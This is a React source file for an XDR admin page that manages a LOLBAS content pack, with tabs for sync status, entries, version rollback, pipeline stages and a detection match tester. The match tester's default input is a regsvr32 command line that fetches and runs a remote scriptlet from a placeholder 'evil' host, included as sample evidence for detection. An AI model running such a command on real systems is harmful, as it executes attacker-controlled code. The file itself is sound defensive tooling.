/**
 * Admin › Content Packs › LOLBAS — Phase A live surface.
 *
 * Consumes:
 *   GET  /api/xdr/lolbas/status         (pack metadata + coverage)
 *   POST /api/xdr/lolbas/sync           (10-stage pipeline)
 *   GET  /api/xdr/lolbas/entries        (paged, filterable)
 *   GET  /api/xdr/lolbas/entries/:name  (full entry + primitives)
 *   GET  /api/xdr/lolbas/versions       (imported pack history)
 *   POST /api/xdr/lolbas/rollback/:id   (flip active version)
 *   POST /api/xdr/lolbas/match          (deterministic evidence match)
 *   POST /api/xdr/lolbas/entries/:name/(enable|disable)
 *
 * Contract:
 *   • Coverage number is whatever the API returns — NEVER hard-coded.
 *   • Every row is authoritative; empty state renders honestly.
 *   • No LLM.  No fabricated entries.  Upstream unreachable →
 *     "UPSTREAM UNAVAILABLE" banner + last-known pack retained.
 */
import React, { useEffect, useMemo, useState } from "react";
import {
  RefreshCcw, Package, ShieldCheck, GitCommit, PlayCircle,
  Power, PowerOff, ExternalLink, ChevronRight, ChevronDown,
  AlertTriangle, CheckCircle2, XCircle, History, Search,
} from "lucide-react";

import api from "@/lib/api";


const STAGES = [
  "DISCOVERED", "DOWNLOADED", "PARSED", "VALIDATED", "NORMALIZED",
  "INDEXED", "PRIMITIVES_GENERATED", "ATTACK_MAPPED",
  "REGRESSION_TESTED", "COMPLETE",
];


function StageBadge({ status }) {
  const color = status === "OK"     ? "var(--mint)"
                   : status === "FAIL"   ? "#f87171"
                   : status === "PARTIAL" ? "var(--amber)"
                                                     : "var(--faint)";
  const Icon  = status === "OK"     ? CheckCircle2
                   : status === "FAIL"   ? XCircle
                                                     : AlertTriangle;
  return (
    <span data-testid={`lolbas-stage-${status?.toLowerCase()}`}
              style={{ display: "inline-flex", alignItems: "center", gap: 3,
                              padding: "1px 6px", border: `1px solid ${color}`,
                              color, borderRadius: 3, fontSize: 9.5,
                              letterSpacing: ".3px", fontFamily: "var(--mono)",
                              fontWeight: 700 }}>
      <Icon size={10} /> {status || "—"}
    </span>
  );
}


function OverviewCard({ status, onSync, syncing, syncErr, lastSyncOutcome }) {
  const v = status?.active_version;
  const coverage = v?.coverage_pct;
  const covColor = coverage === 100 ? "var(--mint)"
                              : coverage != null ? "var(--amber)" : "var(--faint)";
  // Prefer the honest sync_state from the API (introduced in P0-0):
  //   SYNCED · PARTIAL · UPSTREAM_UNAVAILABLE · NEVER_SYNCED
  const outcome = status?.sync_state
                            || (v?.outcome || "NEVER_SYNCED");
  const bundledOk = !!status?.bundled_fallback_available;
  return (
    <div className="panel" style={{ padding: 14 }}
              data-testid="lolbas-overview-card">
      <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
        <Package size={16} style={{ color: "var(--cyan)" }} />
        <b style={{ fontFamily: "var(--mono)", fontSize: 13 }}>LOLBAS</b>
        <span style={{ padding: "1px 6px", border: `1px solid ${covColor}`,
                                color: covColor, borderRadius: 3, fontSize: 10,
                                letterSpacing: ".3px", fontFamily: "var(--mono)",
                                fontWeight: 700 }}
                   data-testid="lolbas-status-badge">
          {outcome}
        </span>
        {bundledOk && (
          <span data-testid="lolbas-bundled-badge"
                    style={{ padding: "1px 6px",
                                    border: "1px solid var(--faint)",
                                    color: "var(--faint)", borderRadius: 3,
                                    fontSize: 9.5, fontFamily: "var(--mono)",
                                    letterSpacing: ".3px" }}
                    title="Bundled last-known-good snapshot is available on-disk">
            BUNDLED FALLBACK · OK
          </span>
        )}
        <span style={{ flex: 1 }} />
        <button className="btn" onClick={onSync} disabled={syncing}
                     data-testid="lolbas-sync-btn"
                     style={{ padding: "3px 10px", fontSize: 11 }}>
          <RefreshCcw size={11} /> {syncing ? "Syncing…" : "Sync now"}
        </button>
      </div>
      <div style={{ display: "grid",
                        gridTemplateColumns: "repeat(auto-fill,minmax(150px,1fr))",
                        gap: 10, marginTop: 12 }}>
        <Stat label="Upstream"  value={v?.upstream_count ?? "—"}
                  testid="lolbas-stat-upstream" />
        <Stat label="Imported"  value={v?.imported ?? "—"}
                  testid="lolbas-stat-imported" />
        <Stat label="Valid"     value={v?.valid ?? "—"}
                  testid="lolbas-stat-valid" />
        <Stat label="Invalid"   value={v?.invalid ?? "—"}
                  testid="lolbas-stat-invalid" />
        <Stat label="Coverage"  value={coverage != null ? `${coverage}%` : "—"}
                  testid="lolbas-stat-coverage" color={covColor} />
        <Stat label="Primitives" value={status?.primitives_total ?? "—"}
                  testid="lolbas-stat-primitives" />
        <Stat label="Enabled (tenant)" value={status?.enabled_for_tenant ?? "—"}
                  testid="lolbas-stat-enabled" />
        <Stat label="Source ver."
                  value={v?.upstream_version || "—"}
                  testid="lolbas-stat-source-ver" mono />
        <Stat label="Synced at"
                  value={(v?.synced_at || "").slice(0, 19).replace("T", " ")}
                  testid="lolbas-stat-synced" mono />
      </div>
      <div style={{ marginTop: 12, fontSize: 10.5, color: "var(--faint)",
                       fontFamily: "var(--mono)", lineHeight: 1.5 }}>
        <ShieldCheck size={11} style={{ verticalAlign: "middle",
                                                             color: "var(--mint)" }} />
        {" "}source: <span style={{ color: "var(--cyan)" }}>
          {status?.source || "LOLBAS Project"}
        </span> · license:{" "}<span style={{ color: "var(--cyan)" }}>
          {status?.license || "CC-BY 4.0"}
        </span> · deterministic-first · AI-optional.
      </div>
      {syncErr && (
        <div data-testid="lolbas-sync-error"
                 style={{ marginTop: 8, padding: 8, borderRadius: 3,
                                 border: "1px dashed var(--amber)",
                                 color: "var(--amber)", fontSize: 11,
                                 fontFamily: "var(--mono)" }}>
          UPSTREAM UNAVAILABLE · {syncErr}
        </div>
      )}
      {lastSyncOutcome && lastSyncOutcome !== "COMPLETE" && !syncErr && (
        <div data-testid="lolbas-partial-banner"
                 style={{ marginTop: 8, padding: 8, borderRadius: 3,
                                 border: "1px dashed var(--amber)",
                                 color: "var(--amber)", fontSize: 11,
                                 fontFamily: "var(--mono)" }}>
          LAST SYNC · {lastSyncOutcome}. See Stages tab for details.
        </div>
      )}
    </div>
  );
}


function Stat({ label, value, testid, sub, color, mono }) {
  return (
    <div data-testid={testid}
             style={{ padding: 10, borderRadius: 4,
                             border: "1px solid var(--border)",
                             background: "var(--panel2)" }}>
      <div className="mono" style={{ fontSize: 10, color: "var(--faint)",
                                                    textTransform: "uppercase",
                                                    marginBottom: 4 }}>
        {label}
      </div>
      <div className={mono ? "mono" : ""}
              style={{ fontSize: mono ? 11 : 16,
                          color: color || "var(--text)",
                          wordBreak: "break-word" }}>
        {value}
      </div>
      {sub && <div style={{ fontSize: 10, color: "var(--faint)",
                                          marginTop: 2 }}>{sub}</div>}
    </div>
  );
}


function StagesTab({ status }) {
  const stages = status?.active_version?.stages || {};
  return (
    <div data-testid="lolbas-tab-stages" style={{ padding: 4 }}>
      <div className="mono" style={{ fontSize: 10, color: "var(--faint)",
                                                    textTransform: "uppercase",
                                                    marginBottom: 6 }}>
        Pipeline (COMPLETE = every stage OK)
      </div>
      {STAGES.map((s) => {
        const info = stages[s] || {};
        return (
          <div key={s} data-testid={`lolbas-stage-row-${s}`}
                   style={{ display: "grid",
                                    gridTemplateColumns: "220px 90px 1fr",
                                    gap: 8, padding: "6px 8px",
                                    borderBottom: "1px solid var(--border)",
                                    fontSize: 11, alignItems: "center" }}>
            <div className="mono" style={{ color: "var(--text-dim)" }}>{s}</div>
            <StageBadge status={info.status} />
            <div className="mono" style={{ fontSize: 10.5,
                                                            color: "var(--faint)",
                                                            wordBreak: "break-word" }}>
              {Object.entries(info).filter(([k]) => k !== "status")
                .map(([k, v]) =>
                  `${k}=${typeof v === "object" ? JSON.stringify(v).slice(0, 80) : v}`,
                ).join(" · ")}
            </div>
          </div>
        );
      })}
    </div>
  );
}


function EntriesTab({ refresh, onToggle, onOpen, filters, setFilters }) {
  const [rows, setRows] = useState([]);
  const [total, setTotal] = useState(0);
  const [loading, setLoading] = useState(false);
  const [err, setErr] = useState(null);
  const [skip, setSkip] = useState(0);
  const limit = 50;

  useEffect(() => {
    (async () => {
      setLoading(true); setErr(null);
      try {
        const params = { skip, limit };
        if (filters.q)        params.q        = filters.q;
        if (filters.category) params.category = filters.category;
        if (filters.mitre)    params.mitre    = filters.mitre;
        const r = await api.get("/xdr/lolbas/entries", { params });
        setRows(r?.data?.data?.entries || []);
        setTotal(r?.data?.data?.total ?? 0);
      } catch (e) {
        setErr(e?.response?.data?.detail || e?.message || "list failed");
        setRows([]);
      } finally { setLoading(false); }
    })();
  }, [refresh, filters, skip]);

  return (
    <div data-testid="lolbas-tab-entries">
      <div style={{ display: "flex", gap: 6, marginBottom: 8, flexWrap: "wrap" }}>
        <input placeholder="search name/description"
                   data-testid="lolbas-filter-q"
                   value={filters.q}
                   onChange={(e) => { setSkip(0); setFilters({ ...filters, q: e.target.value }); }}
                   style={inputStyle} />
        <input placeholder="category (execute, download, …)"
                   data-testid="lolbas-filter-category"
                   value={filters.category}
                   onChange={(e) => { setSkip(0); setFilters({ ...filters, category: e.target.value }); }}
                   style={inputStyle} />
        <input placeholder="MITRE (T1218.010)"
                   data-testid="lolbas-filter-mitre"
                   value={filters.mitre}
                   onChange={(e) => { setSkip(0); setFilters({ ...filters, mitre: e.target.value }); }}
                   style={inputStyle} />
        <span style={{ flex: 1 }} />
        <span className="mono" style={{ fontSize: 10.5, color: "var(--faint)" }}>
          {loading ? "loading…" : `${total} entries`}
        </span>
      </div>
      {err && <div data-testid="lolbas-entries-error"
                             style={{ color: "var(--amber)", fontSize: 11 }}>
        {err}
      </div>}
      <div data-testid="lolbas-entries-rows"
                style={{ border: "1px solid var(--border)", borderRadius: 3,
                                overflow: "hidden" }}>
        <div className="mono" style={rowHead}>
          <div>Name</div><div>Categories</div><div>ATT&amp;CK</div>
          <div>Paths</div><div>State</div><div>Actions</div>
        </div>
        {rows.map((r) => (
          <div key={r.name} className="mono" style={rowBody}
                   data-testid={`lolbas-entry-row-${r.name}`}>
            <div style={{ color: "var(--text)", cursor: "pointer" }}
                     onClick={() => onOpen(r.name)}>
              <span style={{ color: "var(--cyan)" }}>{r.name}</span>
              {r.description && <div style={{ color: "var(--faint)",
                                                                  fontSize: 10 }}>
                {r.description.slice(0, 120)}
              </div>}
            </div>
            <div style={{ fontSize: 10.5, color: "var(--text-dim)" }}>
              {(r.categories || []).slice(0, 4).join(", ")}
            </div>
            <div style={{ fontSize: 10.5, color: "var(--amber)" }}>
              {(r.mitre_ids || []).slice(0, 3).join(", ")}
              {(r.mitre_ids || []).length > 3 && "…"}
            </div>
            <div style={{ fontSize: 10, color: "var(--faint)" }}>
              {(r.paths || [])[0]}
              {(r.paths || []).length > 1 && ` (+${r.paths.length - 1})`}
            </div>
            <div>
              {r.enabled_for_tenant
                ? <span style={{ color: "var(--mint)" }}>ENABLED</span>
                : <span style={{ color: "#f87171" }}>DISABLED</span>}
            </div>
            <div style={{ display: "flex", gap: 4 }}>
              <button className="btn ghost" title="View"
                           data-testid={`lolbas-entry-open-${r.name}`}
                           onClick={() => onOpen(r.name)}
                           style={iconBtn}><ChevronRight size={11} /></button>
              <button className="btn ghost"
                           title={r.enabled_for_tenant ? "Disable" : "Enable"}
                           data-testid={`lolbas-entry-toggle-${r.name}`}
                           onClick={() => onToggle(r)}
                           style={iconBtn}>
                {r.enabled_for_tenant
                  ? <PowerOff size={11} />
                  : <Power size={11} />}
              </button>
            </div>
          </div>
        ))}
        {rows.length === 0 && !loading && (
          <div data-testid="lolbas-entries-empty"
                   style={{ padding: 10, fontSize: 11, color: "var(--faint)",
                                   fontFamily: "var(--mono)" }}>
            NO ENTRIES MATCHING FILTER (sync the pack first if the list is empty).
          </div>
        )}
      </div>
      {total > limit && (
        <div style={{ display: "flex", gap: 6, marginTop: 8,
                          fontFamily: "var(--mono)", fontSize: 11,
                          color: "var(--faint)" }}>
          <button className="btn ghost" disabled={skip === 0}
                       data-testid="lolbas-entries-prev"
                       onClick={() => setSkip(Math.max(0, skip - limit))}
                       style={{ padding: "2px 8px" }}>← prev</button>
          <span>{skip + 1}–{Math.min(skip + limit, total)} of {total}</span>
          <button className="btn ghost" disabled={skip + limit >= total}
                       data-testid="lolbas-entries-next"
                       onClick={() => setSkip(skip + limit)}
                       style={{ padding: "2px 8px" }}>next →</button>
        </div>
      )}
    </div>
  );
}


function EntryDetail({ name, onClose }) {
  const [d, setD]     = useState(null);
  const [err, setErr] = useState(null);
  useEffect(() => {
    (async () => {
      try {
        const r = await api.get(`/xdr/lolbas/entries/${encodeURIComponent(name)}`);
        setD(r?.data?.data);
      } catch (e) {
        setErr(e?.response?.data?.detail || e?.message || "load failed");
      }
    })();
  }, [name]);

  return (
    <div data-testid="lolbas-entry-detail"
             style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,.55)",
                             display: "flex", alignItems: "center",
                             justifyContent: "center", zIndex: 60 }}>
      <div className="panel" style={{ padding: 18, width: 720,
                                                          maxHeight: "82vh", overflow: "auto" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 8,
                          marginBottom: 8 }}>
          <Package size={14} style={{ color: "var(--cyan)" }} />
          <b style={{ fontFamily: "var(--mono)", fontSize: 12 }}>
            {name}
          </b>
          <span style={{ flex: 1 }} />
          <button className="btn ghost" onClick={onClose}
                       data-testid="lolbas-entry-close"
                       style={{ padding: "2px 8px", fontSize: 11 }}>Close</button>
        </div>
        {err && <div style={{ color: "var(--amber)", fontSize: 11 }}>{err}</div>}
        {d && (
          <>
            <div style={{ fontSize: 11, color: "var(--text-dim)",
                              marginBottom: 8, lineHeight: 1.5 }}>
              {d.description}
            </div>
            <div style={{ display: "grid",
                              gridTemplateColumns: "repeat(2,1fr)", gap: 6,
                              fontSize: 10.5, marginBottom: 10 }}>
              <Kv k="Author"      v={d.author} />
              <Kv k="Created"     v={d.created} />
              <Kv k="Categories"  v={(d.categories || []).join(", ")} />
              <Kv k="MITRE IDs"   v={(d.mitre_ids || []).join(", ")} />
              <Kv k="Upstream ver."   v={d.upstream_version} mono />
              <Kv k="Primitives"  v={d.primitives_count} />
            </div>
            <Section title="Paths">
              {(d.paths || []).map((p, i) => (
                <div key={i} className="mono" style={{ fontSize: 10.5,
                                                                                color: "var(--faint)" }}>
                  {p}
                </div>
              ))}
            </Section>
            <Section title="Commands">
              {(d.commands || []).map((c) => (
                <div key={c.index}
                         style={{ padding: 6, marginBottom: 6, borderRadius: 3,
                                         background: "var(--panel2)",
                                         border: "1px solid var(--border)" }}>
                  <div className="mono" style={{ color: "var(--amber)",
                                                                        fontSize: 10.5,
                                                                        wordBreak: "break-all" }}>
                    {c.command}
                  </div>
                  <div style={{ fontSize: 10, color: "var(--faint)",
                                    marginTop: 3 }}>
                    <b>{c.category}</b>{" · "}{c.mitre_id}{" · "}
                    {c.privileges}{" · "}<i>{c.usecase}</i>
                  </div>
                </div>
              ))}
            </Section>
            <Section title="External detections (upstream)">
              {(d.detections || []).map((det, i) => (
                <div key={i} style={{ fontSize: 10.5, marginBottom: 3 }}>
                  <span style={{ color: "var(--cyan)" }}>{det.kind}</span>{" — "}
                  <a href={det.url} target="_blank" rel="noreferrer"
                        style={{ color: "var(--faint)" }}>
                    {det.url} <ExternalLink size={10}
                                                            style={{ verticalAlign: "middle" }} />
                  </a>
                </div>
              ))}
              {(d.detections || []).length === 0 && (
                <div style={{ fontSize: 10.5, color: "var(--faint)" }}>
                  No upstream detection references.
                </div>
              )}
            </Section>
            <Section title={`Generated primitives (${d.primitives_count})`}>
              {(d.primitives || []).slice(0, 60).map((p) => (
                <div key={p.id} className="mono"
                         style={{ fontSize: 10, color: "var(--text-dim)",
                                         padding: "2px 0", wordBreak: "break-all" }}>
                  <span style={{ color: "var(--cyan)" }}>{p.kind}</span>{" · "}
                  {p.value}
                </div>
              ))}
              {(d.primitives || []).length > 60 && (
                <div style={{ fontSize: 10, color: "var(--faint)" }}>
                  showing 60 of {d.primitives_count}
                </div>
              )}
            </Section>
            <div style={{ fontSize: 10, color: "var(--faint)", marginTop: 10,
                              fontFamily: "var(--mono)" }}>
              upstream: <a href={d.upstream_url} target="_blank" rel="noreferrer"
                                        style={{ color: "var(--cyan)" }}>
                {d.upstream_url} <ExternalLink size={10}
                                                              style={{ verticalAlign: "middle" }} />
              </a>
            </div>
          </>
        )}
      </div>
    </div>
  );
}


function Kv({ k, v, mono }) {
  return (
    <div>
      <div className="mono" style={{ fontSize: 9.5, color: "var(--faint)",
                                                    textTransform: "uppercase" }}>{k}</div>
      <div className={mono ? "mono" : ""}
              style={{ fontSize: 11, color: "var(--text)",
                          wordBreak: "break-word" }}>
        {v || "—"}
      </div>
    </div>
  );
}


function Section({ title, children }) {
  const [open, setOpen] = useState(true);
  return (
    <div style={{ marginBottom: 8 }}>
      <div onClick={() => setOpen(!open)}
              style={{ cursor: "pointer", padding: "4px 0",
                          color: "var(--faint)", fontSize: 10.5,
                          fontFamily: "var(--mono)", textTransform: "uppercase" }}>
        {open ? <ChevronDown size={10} /> : <ChevronRight size={10} />}
        {" "}{title}
      </div>
      {open && <div style={{ paddingLeft: 12 }}>{children}</div>}
    </div>
  );
}


function VersionsTab({ refresh, onRollback }) {
  const [rows, setRows] = useState([]);
  useEffect(() => {
    (async () => {
      try {
        const r = await api.get("/xdr/lolbas/versions");
        setRows(r?.data?.data?.versions || []);
      } catch { /* honest empty */ }
    })();
  }, [refresh]);
  return (
    <div data-testid="lolbas-tab-versions">
      <div className="mono" style={rowHead}>
        <div>Synced At</div><div>Outcome</div><div>Upstream</div>
        <div>Imported</div><div>Diff</div><div>Actions</div>
      </div>
      {rows.map((r) => (
        <div key={r.id} className="mono" style={rowBody}
                 data-testid={`lolbas-version-row-${r.id}`}>
          <div>{(r.synced_at || "").slice(0, 19).replace("T", " ")}
            {r.active && <span style={{ marginLeft: 6, color: "var(--mint)" }}>ACTIVE</span>}
          </div>
          <div style={{ color: r.outcome === "COMPLETE" ? "var(--mint)"
                                : r.outcome === "PARTIAL"  ? "var(--amber)"
                                                                            : "#f87171" }}>
            {r.outcome}
          </div>
          <div style={{ color: "var(--faint)" }}>{r.upstream_version}</div>
          <div>{r.imported} / {r.upstream_count}</div>
          <div style={{ fontSize: 10, color: "var(--faint)" }}>
            +{r.diff?.added?.length ?? 0} / -{r.diff?.removed?.length ?? 0} / Δ{r.diff?.modified?.length ?? 0}
          </div>
          <div>
            {!r.active && r.outcome === "COMPLETE" && (
              <button className="btn ghost"
                           data-testid={`lolbas-version-rollback-${r.id}`}
                           onClick={() => onRollback(r.id)}
                           style={iconBtn}>
                <History size={11} /> Roll back
              </button>
            )}
          </div>
        </div>
      ))}
      {rows.length === 0 && (
        <div data-testid="lolbas-versions-empty"
                 style={{ padding: 10, fontSize: 11, color: "var(--faint)",
                                 fontFamily: "var(--mono)" }}>
          NO PACK VERSIONS YET · click Sync now.
        </div>
      )}
    </div>
  );
}


function MatchTester() {
  const [ev, setEv] = useState({ image: "regsvr32.exe",
                                                        command_line: "regsvr32.exe /s /u /i:http://evil/x.sct scrobj.dll" });
  const [hits, setHits] = useState(null);
  const [busy, setBusy] = useState(false);
  const [err, setErr]   = useState(null);
  const run = async () => {
    setBusy(true); setErr(null);
    try {
      const r = await api.post("/xdr/lolbas/match", ev);
      setHits(r?.data?.data);
    } catch (e) {
      setErr(e?.response?.data?.detail || e?.message || "match failed");
      setHits(null);
    } finally { setBusy(false); }
  };
  return (
    <div data-testid="lolbas-tab-match">
      <div className="mono" style={{ fontSize: 10, color: "var(--faint)",
                                                    textTransform: "uppercase",
                                                    marginBottom: 6 }}>
        Deterministic evidence match · never returns a verdict.
      </div>
      <div style={{ display: "grid", gap: 6 }}>
        <label style={{ fontSize: 11, color: "var(--faint)" }}>image
          <input value={ev.image}
                     data-testid="lolbas-match-image"
                     onChange={(e) => setEv({ ...ev, image: e.target.value })}
                     style={inputStyle} />
        </label>
        <label style={{ fontSize: 11, color: "var(--faint)" }}>command_line
          <input value={ev.command_line}
                     data-testid="lolbas-match-cmdline"
                     onChange={(e) => setEv({ ...ev, command_line: e.target.value })}
                     style={inputStyle} />
        </label>
        <div>
          <button className="btn" onClick={run} disabled={busy}
                       data-testid="lolbas-match-run"
                       style={{ padding: "3px 10px", fontSize: 11 }}>
            <PlayCircle size={11} /> {busy ? "Matching…" : "Run match"}
          </button>
        </div>
      </div>
      {err && <div style={{ color: "var(--amber)", fontSize: 11,
                                          marginTop: 8 }}>{err}</div>}
      {hits && (
        <div data-testid="lolbas-match-hits" style={{ marginTop: 10 }}>
          <div className="mono" style={{ fontSize: 10.5, color: "var(--faint)",
                                                            marginBottom: 4 }}>
            {hits.count} evidence hit(s):
          </div>
          {(hits.hits || []).map((h, i) => (
            <div key={i} className="mono"
                     style={{ fontSize: 10.5, color: "var(--text-dim)",
                                     padding: 4, borderTop: "1px solid var(--border)" }}>
              <span style={{ color: "var(--cyan)" }}>{h.kind}</span> ·{" "}
              <b>{h.entry_name}</b> · <span style={{ color: "var(--amber)" }}>
                {h.evidence}
              </span>
              {h.value && <span style={{ color: "var(--faint)" }}>
                {" "}· value=<code>{h.value}</code>
              </span>}
            </div>
          ))}
          <div style={{ marginTop: 6, fontSize: 10, color: "var(--faint)",
                            fontFamily: "var(--mono)" }}>
            {hits.note}
          </div>
        </div>
      )}
    </div>
  );
}


// ── Main body ────────────────────────────────────────────────────
export default function ContentPackLolbasBody() {
  const [tab, setTab]     = useState("overview");
  const [status, setStatus] = useState(null);
  const [refresh, setRefresh] = useState(0);
  const [syncing, setSyncing] = useState(false);
  const [syncErr, setSyncErr] = useState(null);
  const [lastOutcome, setLastOutcome] = useState(null);
  const [openEntry, setOpenEntry] = useState(null);
  const [filters, setFilters] = useState({ q: "", category: "", mitre: "" });

  const loadStatus = async () => {
    try {
      const r = await api.get("/xdr/lolbas/status");
      setStatus(r?.data?.data);
    } catch (e) { setSyncErr(e?.message || "status fetch failed"); }
  };
  useEffect(() => { loadStatus(); /* eslint-disable-next-line */ }, [refresh]);

  const doSync = async () => {
    setSyncing(true); setSyncErr(null); setLastOutcome(null);
    try {
      const r = await api.post("/xdr/lolbas/sync");
      const v = r?.data?.data;
      setLastOutcome(v?.outcome);
      if (v?.outcome === "UPSTREAM_UNAVAILABLE") {
        setSyncErr(v?.stages?.DOWNLOADED?.detail || "upstream unreachable");
      }
      setRefresh((n) => n + 1);
    } catch (e) {
      setSyncErr(e?.response?.data?.detail || e?.message || "sync failed");
    } finally { setSyncing(false); }
  };

  const toggleEntry = async (r) => {
    const op = r.enabled_for_tenant ? "disable" : "enable";
    try {
      await api.post(`/xdr/lolbas/entries/${encodeURIComponent(r.name)}/${op}`);
      setRefresh((n) => n + 1);
    } catch { /* honest failure — refresh already retriggers list */ }
  };

  const doRollback = async (versionId) => {
    if (!window.confirm("Roll back active pack to this version?")) return;
    try {
      await api.post(`/xdr/lolbas/rollback/${versionId}`);
      setRefresh((n) => n + 1);
    } catch { /* keep UI honest */ }
  };

  const TABS = useMemo(() => ([
    { key: "overview", label: "Overview" },
    { key: "entries",  label: "Entries" },
    { key: "match",    label: "Match tester" },
    { key: "versions", label: "Versions" },
    { key: "stages",   label: "Stages" },
  ]), []);

  return (
    <div data-testid="xdr-content-pack-lolbas-body">
      <div style={{ display: "flex", gap: 6, marginBottom: 10,
                       borderBottom: "1px solid var(--border)" }}>
        {TABS.map((t) => (
          <button key={t.key} onClick={() => setTab(t.key)}
                        data-testid={`lolbas-tab-${t.key}`}
                        style={{ padding: "6px 12px",
                                        background: "transparent",
                                        border: "none",
                                        borderBottom: tab === t.key
                                          ? "2px solid var(--mint)" : "2px solid transparent",
                                        color: tab === t.key
                                          ? "var(--text)" : "var(--faint)",
                                        cursor: "pointer",
                                        fontFamily: "var(--mono)",
                                        fontSize: 11,
                                        textTransform: "uppercase",
                                        letterSpacing: ".4px" }}>
            {t.label}
          </button>
        ))}
      </div>

      {tab === "overview" && (
        <OverviewCard status={status} onSync={doSync}
                                syncing={syncing} syncErr={syncErr}
                                lastSyncOutcome={lastOutcome} />
      )}
      {tab === "entries" && (
        <EntriesTab refresh={refresh} onToggle={toggleEntry}
                             onOpen={setOpenEntry}
                             filters={filters} setFilters={setFilters} />
      )}
      {tab === "match"    && <MatchTester />}
      {tab === "versions" && <VersionsTab refresh={refresh} onRollback={doRollback} />}
      {tab === "stages"   && <StagesTab status={status} />}

      {openEntry && (
        <EntryDetail name={openEntry} onClose={() => setOpenEntry(null)} />
      )}
    </div>
  );
}


// ── Styles ────────────────────────────────────────────────────────
const inputStyle = {
  padding: "3px 8px", fontSize: 11, border: "1px solid var(--border)",
  borderRadius: 3, background: "var(--panel2)", color: "var(--text)",
  fontFamily: "var(--mono)", width: 200,
};
const rowHead = {
  display: "grid",
  gridTemplateColumns: "1.8fr 1fr 1fr 1.4fr 0.6fr 0.8fr",
  gap: 6, padding: "4px 8px", background: "var(--panel2)",
  fontSize: 10, color: "var(--faint)", textTransform: "uppercase",
};
const rowBody = {
  display: "grid",
  gridTemplateColumns: "1.8fr 1fr 1fr 1.4fr 0.6fr 0.8fr",
  gap: 6, padding: "6px 8px", fontSize: 11,
  color: "var(--text-dim)", borderTop: "1px solid var(--border)",
  alignItems: "center",
};
const iconBtn = { padding: "2px 6px", fontSize: 10 };
